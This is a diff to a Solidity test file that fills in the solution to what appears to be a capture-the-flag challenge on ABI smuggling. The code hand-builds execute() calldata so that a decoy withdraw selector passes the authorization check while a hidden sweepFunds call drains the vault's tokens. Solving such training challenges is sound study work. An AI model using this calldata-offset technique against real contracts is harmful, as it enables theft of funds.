@@ -70,10 +70,45 @@ contract ABISmugglingChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * =========================================================
+     * SOLUTION - test_abiSmuggling()
+     * =========================================================
+     * Attack: calldata offset manipulation (ABI smuggling)
+     * execute() reads the auth selector from a FIXED offset (byte 100),
+     * assuming actionData always begins there. But actionData is `bytes
+     * calldata` whose true location is set by an offset pointer we control.
+     * 1. Put the player-authorized selector 0xd9caed12 (withdraw) at byte 100
+     *    so the permissions check passes.
+     * 2. Point the actionData offset further down to a payload encoding
+     *    sweepFunds(recovery, token) (selector 0x85fb709d).
+     * 3. execute() forwards that payload to the vault, draining all tokens.
+     *
+     * Single hand-crafted calldata; one player tx via address(vault).call.
+     * =========================================================
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // The real action we want executed once the auth check is fooled.
+        bytes memory sweepCall = abi.encodeWithSelector(
+            vault.sweepFunds.selector, recovery, IERC20(address(token))
+        );
+
+        // Hand-build execute(address,bytes) calldata so that:
+        //  - the actionData offset pointer = 0x80 (places its length word at byte 0x84)
+        //  - byte 0x64 (100) holds the authorized withdraw selector 0xd9caed12
+        //  - the real actionData payload is sweepFunds(recovery, token)
+        bytes memory payload = abi.encodePacked(
+            AuthorizedExecutor.execute.selector,        // [0x00] execute selector (4)
+            bytes32(uint256(uint160(address(vault)))),  // [0x04] target = vault
+            bytes32(uint256(0x80)),                     // [0x24] offset to actionData
+            bytes32(0),                                 // [0x44] filler word
+            bytes4(0xd9caed12),                         // [0x64] authorized selector (read by auth)
+            bytes28(0),                                 // [0x68] pad rest of the word
+            bytes32(sweepCall.length),                  // [0x84] actionData length
+            sweepCall                                   // [0xa4] actionData = sweepFunds(recovery, token)
+        );
+
+        (bool ok,) = address(vault).call(payload);
+        require(ok, "smuggled call failed");
     }
 
     /**
